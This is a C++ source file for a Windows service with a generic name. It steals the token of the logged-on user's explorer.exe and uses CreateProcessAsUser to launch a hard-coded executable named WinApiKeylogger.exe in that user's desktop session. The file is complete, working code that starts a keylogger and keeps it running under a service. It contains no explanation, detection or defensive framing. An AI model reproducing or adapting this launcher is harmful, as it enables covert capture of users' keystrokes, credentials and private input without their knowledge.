#include <windows.h>
#include <tlhelp32.h>
#include <userenv.h>
#include <tchar.h>
#include <iostream>
#include <string>
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Secur32.lib")

#define TARGET_APP_PATH L"C:\\Users\\phunv33\\source\\repos\\WinApiKeylogger\\x64\\Debug\\WinApiKeylogger.exe"
#define SERVICE_NAME L"MyService"

SERVICE_STATUS        g_ServiceStatus = {};
SERVICE_STATUS_HANDLE g_StatusHandle = nullptr;
HANDLE                g_ServiceStopEvent = nullptr;

// Declare the function prototypes
DWORD GetExplorerPID();
bool LaunchInUserSession();

void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    g_ServiceStatus.dwCurrentState = dwCurrentState;
    g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    g_ServiceStatus.dwWaitHint = dwWaitHint;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
        SetEvent(g_ServiceStopEvent);
        ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
        break;
    default:
        break;
    }
}

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    g_ServiceStatus.dwWaitHint = 0;

    ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (!g_ServiceStopEvent) {
        ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }

    // Service is running
    ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

    // --- Place your service work here ---
    // Wait for a user session (explorer.exe) to be available before launching
    for (int i = 0; i < 60; ++i) { // Try for up to 60 seconds
        if (GetExplorerPID() != 0) {
            break;
        }
        Sleep(1000); // Wait 1 second
    }
    LaunchInUserSession(); // Call your function

    // Wait until stop event is signaled
    WaitForSingleObject(g_ServiceStopEvent, INFINITE);

    // Cleanup
    CloseHandle(g_ServiceStopEvent);
    ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

DWORD GetExplorerPID() {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return pid;
}

std::wstring GetUserNameFromToken(HANDLE hToken) {
    WCHAR userName[256];
    DWORD userNameLen = 256;

    // Use the token if provided, otherwise get the current user
    if (hToken) {
        if (ImpersonateLoggedOnUser(hToken)) {
            if (GetUserNameW(userName, &userNameLen)) {
                RevertToSelf();
                return userName;
            }
            RevertToSelf();
        }
    }
    else {
        if (GetUserNameW(userName, &userNameLen)) {
            return userName;
        }
    }
    return L"";
}

bool LaunchInUserSession() {
    DWORD pid = GetExplorerPID();
    if (!pid) {
        wprintf(L"[-] Could not find explorer.exe\n");
        return false;
    }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return false;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        wprintf(L"[-] OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return false;
    }

    HANDLE hUserTokenDup = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserTokenDup)) {
        wprintf(L"[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProc);
        return false;
    }

    // Get username for profile loading
    WCHAR userName[256] = L"";
    DWORD userNameLen = 256;
    if (!GetUserNameW(userName, &userNameLen)) {
        wcscpy_s(userName, L"User");
    }

    // Load user profile (optional, but recommended)
    PROFILEINFO profileInfo = { 0 };
    profileInfo.dwSize = sizeof(PROFILEINFO);
    profileInfo.lpUserName = userName;
    if (!LoadUserProfile(hUserTokenDup, &profileInfo)) {
        wprintf(L"[-] LoadUserProfile failed: %lu\n", GetLastError());
    }

    // Create environment block
    LPVOID env = nullptr;
    if (!CreateEnvironmentBlock(&env, hUserTokenDup, FALSE)) {
        wprintf(L"[-] CreateEnvironmentBlock failed: %lu\n", GetLastError());
        env = nullptr;
    }

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi = { 0 };
    si.lpDesktop = (LPWSTR)L"winsta0\\default";

    BOOL result = CreateProcessAsUser(
        hUserTokenDup,
        TARGET_APP_PATH, NULL,
        NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
        env, NULL,
        &si, &pi
    );

    if (!result) {
        wprintf(L"[-] CreateProcessAsUser failed: %lu\n", GetLastError());
    }
    else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    if (env) DestroyEnvironmentBlock(env);
    UnloadUserProfile(hUserTokenDup, profileInfo.hProfile);
    CloseHandle(hUserTokenDup);
    CloseHandle(hToken);
    CloseHandle(hProc);
    return result ? true : false;
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { (LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
